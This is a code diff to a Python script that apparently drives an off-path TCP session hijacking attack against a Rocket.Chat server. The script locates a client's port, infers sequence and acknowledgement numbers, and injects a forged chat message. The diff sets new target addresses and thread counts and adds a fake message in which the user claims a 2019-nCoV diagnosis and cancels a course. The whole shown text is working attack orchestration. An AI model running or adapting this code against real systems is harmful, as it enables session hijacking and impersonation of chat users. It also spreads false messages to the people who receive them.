@@ -1,6 +1,7 @@
 # coding=utf-8
 
 import time
+import json
 
 from IPID_HCSC.connetcion_find import Connection_Finder
 from IPID_HCSC.seq_find import Seq_Finder
@@ -12,18 +13,17 @@ if __name__ == '__main__':
     server_ip = '172.21.0.12'
     server_port = 3000
 
-    client_ip = '182.92.129.182'
+    client_ip = '61.137.215.26'
 
     attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.8.150'
+    collision_ip = '10.10.7.73'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                                    server_port=server_port, bind_if_name=attack_bind_if,
-                                   verbose=True)
+                                   block_size=500, num_thread=2, verbose=True, reverse=True)
     connection.run()
     client_port = connection.result
-
     if client_port == -1:
         print('No Connection Found.')
         exit(1)
@@ -31,10 +31,9 @@ if __name__ == '__main__':
     time.sleep(3)
     seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                      server_port=server_port, client_port=client_port,
-                     bind_ifname=attack_bind_if, verbose=True)
+                     bind_ifname=attack_bind_if, chunk_size=500, num_thread=3, verbose=True)
     seq.run()
     seq_in_win = seq.result
-
     if seq_in_win == -1:
         print('Seq Find Miss')
         jstr = json.dumps({'res':0})
@@ -46,8 +45,9 @@ if __name__ == '__main__':
         ack.run_attack_rocket_chat()
         seq_num = ack.seq_num
         ack_num = ack.ack_in_win
-        attack_action_rocketchat(client_ip=client_ip, server_ip=server_ip, client_port=client_port,
-                                 server_port=server_port, seq=seq_num, ack=ack_num, room_id='zqYBGxeXzeLYdHf8L')
+        attack_action_rocketchat(client_ip=client_ip, server_ip=server_ip, client_port=client_port, ifname=attack_bind_if,
+                                 forged_message='So sorry, because I was diagnosed with 2019-nCoV, this course will be cancelled.',
+                                 server_port=server_port, seq=seq_num, ack=ack_num, room_id='7cDqEshwAFvFuxcxQ')
 
         print('------ Total Statistics ------')
         print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
